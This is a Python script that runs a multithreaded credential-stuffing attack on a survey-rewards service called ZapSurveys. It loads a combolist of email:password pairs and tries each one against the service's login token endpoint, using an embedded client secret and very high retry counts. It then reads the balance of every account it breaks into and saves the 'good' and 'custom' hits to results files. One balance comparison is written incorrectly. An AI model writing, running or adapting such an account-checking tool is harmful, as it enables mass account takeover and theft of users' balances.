import datetime
import threading
from filemanager import OpenFile
from functions import log
import requests
from requests.adapters import HTTPAdapter
from Variables import Zappy
from urllib3.util import Retry
from threading import Lock
from colored import fg
import os


yellow = fg(3)
green = fg(2)
reset = fg(7)
cyan = fg(6)
magenta = fg(135)
red = fg(1)
dark_yellow = fg(166)
dark_cyan = fg(4)
rosy_brown = fg(138)


class ZapSurveys:
    def __init__(self):
        self.bad_accounts = []
        self.custom_accounts =[]
        self.good_accounts = []
        self.lock = threading.Lock()
        pass

    def start(self, num_threads=1):
        combolist = OpenFile()

        threads = []


        for combo in combolist:
            try:
                email, password = combo.split(':', 1)
            except:
                email, password = combo.split('|', 1)
            t = threading.Thread(target=self.process_combo, args=(email, password, combo))
            threads.append(t)
            t.start()

            # If the number of active threads equals the desired number of threads, wait for them to complete
            if len(threads) == num_threads:
                for t in threads:
                    t.join()
                threads = []

        # Wait for any remaining threads to complete
        for t in threads:
            t.join()
        

        if not os.path.exists('results'):
            os.mkdir('results')
        
        now = datetime.datetime.now()

        # Write the custom accounts to file
        custom_filename = f"results/custom-{now.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
        with open(custom_filename, 'w') as f:
            for account in self.custom_accounts:
                f.write(f"{account}\n")

        # Write the good accounts to file
        good_filename = f"results/good-{now.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
        with open(good_filename, 'w') as f:
            for account in self.good_accounts:
                f.write(f"{account}\n")
        
        print(f"""



        {red}[+] Bad: {len(self.bad_accounts)}{reset}
        {green}[+] Good: {len(self.good_accounts)}{reset}
        {yellow}[+] Custom: {len(self.custom_accounts)}{reset}

        {magenta}{'Saved Accounts To Results Folder'}{reset}



        """)


        

    def process_combo(self, email, password, combo):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
            'Pragma': 'no-cache',
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Language': 'en-US,en;q=0.8'
        }
        
        # Define the retry strategy
        retry_strategy = Retry(
            total=1000000000000,
            backoff_factor=0,
            status_forcelist=[ 500, 502, 503, 504 ]
        )
        
        # Mount the retry strategy to the HTTP adapter
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session = requests.Session()
        session.mount("https://", adapter)
        session.mount("http://", adapter)

        data = f"password={password}&grant_type=password&scope=offline_access&client_secret=fNbN4th7onoKY6Quo66N32Z8&client_id=android&username={email}"
        
        try:
            # Make the request with retry logic
            response = session.post(
                "https://lootlagoon.com/api/v4/auth/token", headers=headers, data=data)

            if "errorDescription" in response.json() or "error" in response.json():
                Zappy.bad += 1
                with self.lock:
                    self.bad_accounts.append(combo)
                if Zappy.cui:
                    log(
                        type="bad",
                        account=combo ,
                        title="ZapSurverys"
                    )
                else:
                    pass
            else:
                access_token = response.json()['access_token']
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
                    'Pragma': 'no-cache',
                    'Accept': '*/*',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept-Language': 'en-US,en;q=0.8',
                    'Authorization': f'Bearer {access_token}'
                }
                
                # Make the request with retry logic
                response = session.get("https://lootlagoon.com/api/v6/user/", headers=headers)
                balance = response.json()['balance']

                if Zappy.cui == True:
                    if balance > 0 < 10:
                        with self.lock:
                            self.custom_accounts.append(combo)
                        Zappy.custom += 1
                        log(
                            type="custom",
                            account=combo ,
                            title=f"ZapSurverys | {balance}"
                        )
                    elif balance >= 10:
                        Zappy.good += 1
                        with self.lock:
                            self.good_accounts.append(combo)
                        log(
                            type="good",
                            account=combo ,
                            title=f"ZapSurverys | {balance}"
                        )
                        

                    else:
                        Zappy.bad += 1
                        with self.lock:
                            self.bad_accounts.append(combo)
                        log(
                            type="bad",
                            account=combo ,
                            title="ZapSurverys"
                        )
                elif Zappy.cui == False:
                    print("Yo")
        except requests.exceptions.ConnectionError:
            pass  # Ignore the error
        
        return
    

   


